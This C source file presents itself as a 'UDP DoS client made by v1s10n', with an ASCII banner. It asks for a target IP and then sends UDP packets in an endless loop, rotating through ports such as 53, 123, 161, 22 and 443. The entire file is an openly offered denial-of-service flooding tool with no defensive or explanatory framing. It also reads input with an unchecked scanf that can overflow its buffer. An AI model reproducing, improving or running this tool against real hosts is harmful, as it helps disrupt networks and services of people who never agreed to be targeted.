=#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char ip[100];
    int portlist[] = {53, 67, 68, 123, 161, 514, 23, 22, 443};  // List of ports to target
    int listSize = sizeof(portlist) / sizeof(portlist[0]);  // Size of the list
    int counter = 0;  // Start from the first port
    char message[] = "";  // Example message to send

    printf("\033[31m");
    printf(" /$$      /$$ /$$$$$$$   /$$$$$$   /$$$$$$ \n");
    printf("| $$$    /$$$| $$__  $$ /$$__  $$ /$$__  $$\n");
    printf("| $$$$  /$$$$| $$  \\ $$| $$  \\ $$| $$  \\__/\n");
    printf("| $$ $$/$$ $$| $$  | $$| $$  | $$|  $$$$$$ \n");
    printf("| $$  $$$| $$| $$  | $$| $$  | $$ \\____  $$\n");
    printf("| $$\\  $ | $$| $$  | $$| $$  | $$ /$$  \\ $$\n");
    printf("| $$ \\/  | $$| $$$$$$$/|  $$$$$$/|  $$$$$$/\n");
    printf("|__/     |__/|_______/  \\______/  \\______/ \n");
    printf("\n");
    printf("UDP DoS client made by v1s10n\n");
    printf("\n");
    
    // Get the target IP address from the user
    printf("Enter IP address: ");
    scanf("%s", ip);
    printf("\n");

    // Create the UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("UDP socket creation failed");
        return 1;
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        close(sock);
        return 1;
    }

    int packet_number = 1;
    while (1) {  // Infinite loop for sending packets
        // Rotate through the ports
        server_addr.sin_port = htons(portlist[counter]);

        // Send the UDP packet
        sendto(sock, message, strlen(message), 0,
               (struct sockaddr*)&server_addr, sizeof(server_addr));
        printf("UDP packet %d sent to %s:%d\n", packet_number, ip, portlist[counter]);

        packet_number++;

        // Update counter and cycle through the ports
        counter++;
        if (counter >= listSize) {
            counter = 0;  // Reset counter when reaching the end of the list
        }

        // Optional: To break out of the loop after a certain number of packets
        // if (packet_number > 100) break;
    }

    // Close the socket
    close(sock);
    return 0;
}
